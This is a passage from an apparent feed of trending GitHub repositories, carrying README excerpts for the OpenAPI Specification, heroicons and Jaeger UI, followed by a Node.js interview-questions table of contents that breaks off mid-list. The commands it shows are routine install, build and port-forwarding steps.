&lt;p&gt;Looking to see how you can create your own OpenAPI definition, present it, or otherwise use it? Check out the growing &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/IMPLEMENTATIONS.md&quot;&gt;list of implementations&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Participation&lt;/h2&gt; 
&lt;p&gt;The current process for development of the OpenAPI Specification is described in &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/DEVELOPMENT.md&quot;&gt;Development Guidelines&lt;/a&gt;. Development of the next version of the OpenAPI Specification is guided by the &lt;a href=&quot;https://www.openapis.org/participate/how-to-contribute/governance#TDC&quot;&gt;Technical Steering Committee (TSC)&lt;/a&gt;. This group of committers bring their API expertise, incorporate feedback from the community, and expand the group of committers as appropriate. All development activity on the future specification will be performed as features and merged into this branch. Upon release of the future specification, this branch will be merged to master.&lt;/p&gt; 
&lt;p&gt;The TSC holds weekly web conferences to review open pull requests and discuss open issues related to the evolving OpenAPI Specification. Participation in weekly calls and scheduled working sessions is open to the community. You can view the &lt;a href=&quot;https://openapi.groups.io/g/tsc/calendar&quot;&gt;TSC calendar online&lt;/a&gt;, and import it to your calendar using the &lt;a href=&quot;https://openapi.groups.io/g/tsc/ics/1105671/1995679554/feed.ics&quot;&gt;iCal link&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The OpenAPI Initiative encourages participation from individuals and companies alike. If you want to participate in the evolution of the OpenAPI Specification, consider taking the following actions:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Review the &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/versions/3.1.0.md&quot;&gt;current specification&lt;/a&gt;. The human-readable markdown file &lt;em&gt;is the source of truth&lt;/em&gt; for the specification.&lt;/li&gt; 
 &lt;li&gt;Review the &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/DEVELOPMENT.md&quot;&gt;development&lt;/a&gt; process so you understand how the spec is evolving.&lt;/li&gt; 
 &lt;li&gt;Check the &lt;a href=&quot;https://github.com/OAI/OpenAPI-Specification/issues&quot;&gt;issues&lt;/a&gt; and &lt;a href=&quot;https://github.com/OAI/OpenAPI-Specification/pulls&quot;&gt;pull requests&lt;/a&gt; to see if someone has already documented your idea or feedback on the specification. You can follow an existing conversation by subscribing to the existing issue or PR.&lt;/li&gt; 
 &lt;li&gt;Create an issue to describe a new concern. If possible, propose a solution.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Not all feedback can be accommodated and there may be solid arguments for or against a change being appropriate for the specification.&lt;/p&gt; 
&lt;h2&gt;Licensing&lt;/h2&gt; 
&lt;p&gt;See: &lt;a href=&quot;https://github.com/OAI/OpenAPI-Specification/blob/master/LICENSE&quot;&gt;License (Apache-2.0)&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://ga-beacon.appspot.com/UA-831873-42/readme.md?pixel&quot; alt=&quot;Analytics&quot;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>tailwindlabs/heroicons</title>
      <link>https://github.com/tailwindlabs/heroicons</link>
      <description>&lt;p&gt;A set of free MIT-licensed high-quality SVG icons for UI development.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Basic Usage&lt;/h2&gt; 
&lt;p&gt;The quickest way to use these icons is to simply copy the source for the icon you need from &lt;a href=&quot;https://heroicons.com&quot;&gt;heroicons.com&lt;/a&gt; and inline it directly into your HTML:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;svg class=&quot;h-6 w-6 text-gray-500&quot; fill=&quot;none&quot; viewBox=&quot;0 0 24 24&quot; stroke=&quot;currentColor&quot;&amp;gt;
  &amp;lt;path
    stroke-linecap=&quot;round&quot;
    stroke-linejoin=&quot;round&quot;
    stroke-width=&quot;2&quot;
    d=&quot;M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z&quot;
  /&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Both icon styles are preconfigured to be stylable by setting the &lt;code&gt;color&lt;/code&gt; CSS property, either manually or using utility classes like &lt;code&gt;text-gray-500&lt;/code&gt; in a framework like &lt;a href=&quot;https://tailwindcss.com&quot;&gt;Tailwind CSS&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;React&lt;/h2&gt; 
&lt;p&gt;First, install &lt;code&gt;@heroicons/react&lt;/code&gt; from npm:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;npm install @heroicons/react
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Now each icon can be imported individually as a React component:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;import { BeakerIcon } from &#39;@heroicons/react/solid&#39;

function MyComponent() {
  return (
    &amp;lt;div&amp;gt;
      &amp;lt;BeakerIcon className=&quot;h-5 w-5 text-blue-500&quot;/&amp;gt;
      &amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
  )
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The 24x24 outline icons can be imported from &lt;code&gt;@heroicons/react/outline&lt;/code&gt;, and the 20x20 solid icons can be imported from &lt;code&gt;@heroicons/react/solid&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;Icons use an upper camel case naming convention and are always suffixed with the word &lt;code&gt;Icon&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://unpkg.com/browse/@heroicons/react/outline/&quot;&gt;Browse the full list of icon names on UNPKG ‚Üí&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Vue&lt;/h2&gt; 
&lt;p&gt;First, install &lt;code&gt;@heroicons/vue&lt;/code&gt; from npm:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;npm install @heroicons/vue
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Now each icon can be imported individually as a Vue component:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-vue&quot;&gt;&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;BeakerIcon class=&quot;h-5 w-5 text-blue-500&quot;/&amp;gt;
    &amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
import { BeakerIcon } from &#39;@heroicons/vue/solid&#39;

export default {
  components: { BeakerIcon }
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The 24x24 outline icons can be imported from &lt;code&gt;@heroicons/vue/outline&lt;/code&gt;, and the 20x20 solid icons can be imported from &lt;code&gt;@heroicons/vue/solid&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;Icons use an upper camel case naming convention and are always suffixed with the word &lt;code&gt;Icon&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://unpkg.com/browse/@heroicons/vue/outline/&quot;&gt;Browse the full list of icon names on UNPKG ‚Üí&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;This library is MIT licensed.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>jaegertracing/jaeger-ui</title>
      <link>https://github.com/jaegertracing/jaeger-ui</link>
      <description>&lt;p&gt;Web UI for Jaeger&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/jaegertracing/jaeger-ui/actions&quot;&gt;&lt;img src=&quot;https://github.com/jaegertracing/jaeger-ui/workflows/Unit%20Tests/badge.svg?branch=master&quot; alt=&quot;Build Status&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://codecov.io/gh/jaegertracing/jaeger-ui&quot;&gt;&lt;img src=&quot;https://codecov.io/gh/jaegertracing/jaeger-ui/branch/master/graph/badge.svg&quot; alt=&quot;Coverage Status&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://app.fossa.io/projects/git%2Bgithub.com%2Fjaegertracing%2Fjaeger-ui?ref=badge_shield&quot;&gt;&lt;img src=&quot;https://app.fossa.io/api/projects/git%2Bgithub.com%2Fjaegertracing%2Fjaeger-ui.svg?type=shield&quot; alt=&quot;FOSSA Status&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Jaeger UI&lt;/h1&gt; 
&lt;p&gt;Visualize distributed tracing with Jaeger.&lt;/p&gt; 
&lt;p&gt;| Trace Search | Trace Details | | :------------------------------------: | :------------------------------------: | | &lt;img src=&quot;https://raw.githubusercontent.com/jaegertracing/jaeger-ui/master/media/ss_search.png&quot; alt=&quot;Trace Search&quot;&gt; | &lt;img src=&quot;https://raw.githubusercontent.com/jaegertracing/jaeger-ui/master/media/ss_trace.png&quot; alt=&quot;Trace Details&quot;&gt; |&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/jaegertracing/jaeger-ui/master/CONTRIBUTING.md&quot;&gt;CONTRIBUTING&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;The app was built with &lt;a href=&quot;https://github.com/facebookincubator/create-react-app&quot;&gt;create-react-app&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Running the application&lt;/h3&gt; 
&lt;p&gt;Fork, then clone the &lt;code&gt;jaeger-ui&lt;/code&gt; repo and change directory into it.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;git clone https://github.com/jaegertracing/jaeger-ui.git
cd jaeger-ui
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Use the recommended Node versions: (defined in &lt;a href=&quot;https://raw.githubusercontent.com/jaegertracing/jaeger-ui/master/.nvmrc&quot;&gt;.nvmrc&lt;/a&gt; file):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;nvm use
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Install dependencies via &lt;code&gt;yarn&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;yarn install
# or
yarn
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Make sure you have the Jaeger Query service running on http://localhost:16686. For example, you can run Jaeger all-in-one Docker image as described in the &lt;a href=&quot;https://www.jaegertracing.io/docs/latest/getting-started/&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;If you don&#39;t have it running locally, then tunnel to the correct host and port.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;ssh -fN -L 16686:$BACKEND_HOST:$BACKEND_PORT $BACKEND_HOST
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If you are using &lt;a href=&quot;https://www.jaegertracing.io/docs/1.7/deployment/#ui-base-path&quot;&gt;UI Base Path&lt;/a&gt; feature, you need to append the base path into &lt;code&gt;proxy-&amp;gt;/api-&amp;gt;target&lt;/code&gt; in package.json file. for example: if the base path is &lt;code&gt;&quot;/jaeger&quot;&lt;/code&gt;, then the target should be &lt;code&gt;&quot;http://localhost:16686/jaeger&quot;&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;Start the development server with hot loading:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;yarn start
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Commands&lt;/h4&gt; 
&lt;p&gt;| Command | Description | | ------------ | ------------------------------------------------------------------- | | &lt;code&gt;yarn start&lt;/code&gt; | Starts development server with hot reloading and api proxy. | | &lt;code&gt;yarn test&lt;/code&gt; | Run all the tests | | &lt;code&gt;yarn lint&lt;/code&gt; | Lint the project (eslint, prettier, typescript) | | &lt;code&gt;yarn build&lt;/code&gt; | Runs production build. Outputs files to &lt;code&gt;packages/jaeger-ui/build&lt;/code&gt;. |&lt;/p&gt; 
&lt;h2&gt;Build&lt;/h2&gt; 
&lt;p&gt;Running build will output all the static files to the &lt;code&gt;packages/jaeger-ui/build&lt;/code&gt; folder:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;yarn install
yarn build
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;UI Configuration&lt;/h2&gt; 
&lt;p&gt;See the &lt;a href=&quot;https://www.jaegertracing.io/docs/latest/frontend-ui/&quot;&gt;configuration guide&lt;/a&gt; for details on configuring Google Analytics tracking, menu customizations, and other aspects of UI behavior.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/jaegertracing/jaeger-ui/master/LICENSE&quot;&gt;Apache 2.0 License&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>learning-zone/nodejs-interview-questions</title>
      <link>https://github.com/learning-zone/nodejs-interview-questions</link>
      <description>&lt;p&gt;Frequently Asked Node.js Interview Questions&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Node.js Interview Questions&lt;/h1&gt; 
&lt;p&gt;&lt;em&gt;Click 
  &lt;!-- raw HTML omitted --&gt; if you like the project. Pull Request are highly appreciated.&lt;/em&gt;&lt;/p&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/nodejs-api.md&quot;&gt;NodeJS APIs&lt;/a&gt;&lt;/em&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;| Sl.No| Questions | |------|------------------| | 01. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-does-the-runtime-environment-mean-in-nodejs&quot;&gt;What does the runtime environment mean in Node.js?&lt;/a&gt;| | 02. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-nodejs&quot;&gt;What is Node.js?&lt;/a&gt;| | 03. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-nodejs-process-model&quot;&gt;What is Node.js Process Model?&lt;/a&gt;| | 04. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-the-data-types-in-nodejs&quot;&gt;What are the data types in Node.js?&lt;/a&gt;| | 05. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-create-a-simple-server-in-nodejs-that-returns-hello-world&quot;&gt;How to create a simple server in Node.js that returns Hello World?&lt;/a&gt;| | 06. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-do-nodejs-works&quot;&gt;How do Node.js works?&lt;/a&gt;| | 07. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-an-error-first-callback&quot;&gt;What is an error-first callback?&lt;/a&gt;| | 08. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-callback-hell-in-nodejs&quot;&gt;What is callback hell in Node.js?&lt;/a&gt;| | 09. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-promises-in-nodejs&quot;&gt;What are Promises in Node.js?&lt;/a&gt;| | 10. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-tools-can-be-used-to-assure-consistent-style&quot;&gt;What tools can be used to assure consistent style?&lt;/a&gt;| | 11. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-when-should-you-npm-and-when-yarn&quot;&gt;When should you npm and when yarn?&lt;/a&gt;| | 12. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-a-stub&quot;&gt;What is a stub?&lt;/a&gt;| | 13. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-a-test-pyramid-how-can-you-implement-it-when-talking-about-http-apis&quot;&gt;What is a test pyramid? How can you implement it when talking about HTTP APIs?&lt;/a&gt;| | 14. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-can-you-secure-your-http-cookies-against-xss-attacks&quot;&gt;How can you secure your HTTP cookies against XSS attacks?&lt;/a&gt;| | 15. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-can-you-make-sure-your-dependencies-are-safe&quot;&gt;How can you make sure your dependencies are safe?&lt;/a&gt;| | 16. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-event-loop-in-nodejs-and-how-does-it-work&quot;&gt;What is Event loop in Node.js? And How does it work?&lt;/a&gt;| | 17. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-repl-what-purpose-it-is-used-for&quot;&gt;What is REPL? What purpose it is used for?&lt;/a&gt;| | 18. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-the-difference-between-asynchronous-and-non-blocking&quot;&gt;What is the difference between Asynchronous and Non-blocking?&lt;/a&gt;| | 19. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-debug-an-application-in-nodejs&quot;&gt;How to debug an application in Node.js?&lt;/a&gt;| | 20. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-some-of-the-most-popular-modules-of-nodejs&quot;&gt;What are some of the most popular modules of Node.js?&lt;/a&gt;| | 21. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-eventemitter-in-nodejs&quot;&gt;What is EventEmitter in Node.js?&lt;/a&gt;| | 22. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-many-types-of-streams-are-present-in-nodejs&quot;&gt;How many types of streams are present in node.js?&lt;/a&gt;| | 23. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-crypto-in-nodejs-how-do-you-cipher-the-secure-information-in-nodejs&quot;&gt;What is crypto in Node.js? How do you cipher the secure information in Node.js?&lt;/a&gt;| | 24. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-the-use-of-dns-module-in-nodejs&quot;&gt;What is the use of DNS module in Node.js?&lt;/a&gt;| | 25. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-the-security-mechanisms-available-in-nodejs&quot;&gt;What are the security mechanisms available in Node.js?&lt;/a&gt;| | 26. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-name-the-types-of-api-functions-in-nodejs&quot;&gt;Name the types of API functions in Node.js.&lt;/a&gt; | 27. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-does-nodejs-handle-child-threads&quot;&gt;How does Node.js handle child threads?&lt;/a&gt;| | 28. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-the-preferred-method-of-resolving-unhandled-exceptions-in-nodejs&quot;&gt;What is the preferred method of resolving unhandled exceptions in Node.js?&lt;/a&gt;| | 29. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-does-nodejs-support-multi-processor-platforms-and-does-it-fully-utilize-all-processor-resources&quot;&gt;How does Node.js support multi-processor platforms, and does it fully utilize all processor resources?&lt;/a&gt;| | 30. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-typically-the-first-argument-passed-to-a-nodejs-callback-handler&quot;&gt;What is typically the first argument passed to a Node.js callback handler?&lt;/a&gt;| | 31. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-nodejs-read-the-content-of-a-file&quot;&gt;How Node.js read the content of a file?&lt;/a&gt;| | 32. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-jit-and-how-is-it-related-to-nodejs&quot;&gt;What is JIT and how is it related to Node.js?&lt;/a&gt;| | 33. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-difference-between-put-and-patch&quot;&gt;What is difference between put and patch?&lt;/a&gt;| | 34. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-list-types-of-http-requests-supported-by-nodejs&quot;&gt;List types of Http requests supported by Node.js.&lt;/a&gt; | 35. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-why-to-use-expressjs&quot;&gt;Why to use Express.js?&lt;/a&gt;| | 36. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-write-the-steps-for-setting-up-an-express-js-application&quot;&gt;Write the steps for setting up an Express JS application.&lt;/a&gt; | 37. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-since-node-is-a-single-threaded-process-how-to-make-use-of-all-cpus&quot;&gt;Since node is a single threaded process, how to make use of all CPUs?&lt;/a&gt;| | 38. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-does-emitter-do-and-what-is-dispatcher&quot;&gt;What does emitter do and what is dispatcher?&lt;/a&gt;| | 39. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-kill-child-processes-that-spawn-their-own-child-processes-in-nodejs&quot;&gt;How to kill child processes that spawn their own child processes in Node.js?&lt;/a&gt;| | 40. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-do-you-understand-by-reactor-pattern-in-nodejs&quot;&gt;What do you understand by Reactor Pattern in Node.js?&lt;/a&gt;| | 41. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-the-key-features-of-nodejs&quot;&gt;What are the key features of Node.js?&lt;/a&gt;| | 42. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-globals-in-nodejs&quot;&gt;What are globals in Node.js?&lt;/a&gt;| | 43. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-chaining-process-in-nodejs&quot;&gt;What is chaining process in Node.js?&lt;/a&gt;| | 44. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-a-control-flow-function-what-are-the-steps-does-it-execute&quot;&gt;What is a control flow function? what are the steps does it execute?&lt;/a&gt;| | 45. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-npm-in-nodejs&quot;&gt;What is npm in Node.js?&lt;/a&gt;| | 46. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-when-to-use-nodejs-and-when-not-to-use-it&quot;&gt;When to use Node.js and when not to use it?&lt;/a&gt;| | 47. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-explain-how-does-nodejs-work&quot;&gt;Explain how does Node.js work?&lt;/a&gt;| | 48. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-is-nodejs-entirely-based-on-a-single-thread&quot;&gt;Is Node.js entirely based on a single-thread?&lt;/a&gt;| | 49. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-make-post-request-in-nodejs&quot;&gt;How to make post request in Node.js?&lt;/a&gt;| | 50. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-can-you-create-http-server-in-nodejs-explain-the-code-used-for-it&quot;&gt;Can you create http server in Node.js, explain the code used for it?&lt;/a&gt;| | 51. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-load-html-in-nodejs&quot;&gt;How to load html in Node.js?&lt;/a&gt;| | 52. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-can-you-listen-on-port-80-with-node&quot;&gt;How can you listen on port 80 with Node?&lt;/a&gt;| | 53. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-the-difference-between-operational-and-programmer-errors&quot;&gt;What is the difference between operational and programmer errors?&lt;/a&gt;| | 54. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-why-npm-shrinkwrap-is-useful&quot;&gt;Why npm shrinkwrap is useful?&lt;/a&gt;| | 55. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-your-favourite-http-framework-and-why&quot;&gt;What is your favourite HTTP framework and why?&lt;/a&gt;| | 56. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-the-challenges-with-nodejs&quot;&gt;What are the Challenges with Node.js?&lt;/a&gt;| | 57. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-the-difference-between-nodejs-vs-ajax&quot;&gt;What is the difference between Node.js vs Ajax?&lt;/a&gt;| | 58. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-nodejs-overcomes-the-problem-of-blocking-of-i-o-operations&quot;&gt;How Node.js overcomes the problem of blocking of I/O operations?&lt;/a&gt;| | 59. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-mention-the-steps-by-which-you-can-async-in-nodejs&quot;&gt;Mention the steps by which you can async in Node.js?&lt;/a&gt;| | 60. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-the-timing-features-of-nodejs&quot;&gt;What are the timing features of Node.js?&lt;/a&gt;| | 61. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-lts-releases-of-nodejs-why-should-you-care&quot;&gt;What is LTS releases of Node.js why should you care?&lt;/a&gt;| | 62. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-why-should-you-separate-express-app-and-server&quot;&gt;Why should you separate Express &#39;app&#39; and &#39;server&#39;?&lt;/a&gt;| | 63. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-the-difference-between-processnexttick-and-setimmediate&quot;&gt;What is the difference between process.nextTick() and setImmediate()?&lt;/a&gt;| | 64. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-difference-between-javascript-and-nodejs&quot;&gt;What is difference between JavaScript and Node.js?&lt;/a&gt;| | 65. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-are-the-difference-between-events-and-callbacks&quot;&gt;What are the difference between Events and Callbacks?&lt;/a&gt;| | 66. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-explain-restful-web-services-in-nodejs&quot;&gt;Explain RESTful Web Services in Node.js?&lt;/a&gt;| | 67. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-handle-file-upload-in-node-js&quot;&gt;How to handle file upload in Node js?&lt;/a&gt;| | 68. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-explain-the-terms-body-parser-cookie-parser-debug-jade-morgan-nodemon-pm2-serve-favicon-cors-in-express-js&quot;&gt;Explain the terms body-parser, cookie-parser, debug, jade, morgan, nodemon, pm2, serve-favicon, cors in Express JS?&lt;/a&gt;| | 69. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-does-routing-work-in-node-js&quot;&gt;How does routing work in Node.js&lt;/a&gt;| | 70. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-node-prevents-blocking-code&quot;&gt;How Node prevents blocking code?&lt;/a&gt;| | 71. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-what-is-difference-between-promise-and-async-await-in-node-js&quot;&gt;What is difference between promise and async await in node js?&lt;/a&gt;| | 72. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-use-json-web-token-jwt-for-authentication-in-node-js&quot;&gt;How to use JSON Web Token (JWT) for authentication in node js?&lt;/a&gt;| | 73. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-build-a-microservices-architecture-with-node-js&quot;&gt;How to build a microservices architecture with node js?&lt;/a&gt;| | 74. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-use-q-promise-in-node-js&quot;&gt;How to use Q promise in node js?&lt;/a&gt;| | 75. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-use-locale-i18n-in-node-js&quot;&gt;How to use locale (i18n) in node js?&lt;/a&gt;| | 76. |&lt;a 